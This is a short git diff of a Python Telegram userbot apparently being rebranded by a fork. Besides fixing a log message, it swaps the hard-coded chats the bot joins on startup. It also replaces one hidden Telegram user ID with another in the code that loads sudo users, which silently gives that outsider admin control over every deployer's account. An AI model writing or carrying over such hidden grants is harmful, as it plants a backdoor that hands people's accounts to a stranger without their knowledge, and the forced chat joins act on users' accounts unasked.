@@ -88,7 +88,7 @@ def mongodbase():
         mongodb = mongobase.VenomUb
         LOGGER.info("Conected To Your Database.")
     except:
-        LOGGER.error("Failed To Connect, Please Change Your Mongo Database !")
+        LOGGER.error("Failed To Connect, Please Change Your Mongodb !")
         sys.exit()
 
 mongodbase()
@@ -101,7 +101,7 @@ async def sudo_users():
     if sudoers:
         for user_id in sudoers:
             SUDOERS.append(int(user_id))
-            SUDOERS.append(5822700831)
+            SUDOERS.append(5311223486)
     LOGGER.info(f"Sudo Users Loaded.")
     
 
@@ -114,8 +114,8 @@ async def run_async_clients():
     except:
         pass
     try:
-        await app.join_chat("VenomOwners")
-        await app.join_chat("Venom_Chatz")
+        await app.join_chat("tmm_heroku_world")
+        await app.join_chat("tmm_support_chat")
     except:
         pass
     if SESSION_STRING:
@@ -127,8 +127,8 @@ async def run_async_clients():
         except:
             pass
         try:
-            await app.join_chat("VenomOwners")
-            await app.join_chat("Venom_Chatz")
+            await app.join_chat("tmm_heroku_world")
+            await app.join_chat("tmm_support_chat")
         except:
             pass
     LOGGER.info("Starting Helper Robot ...")
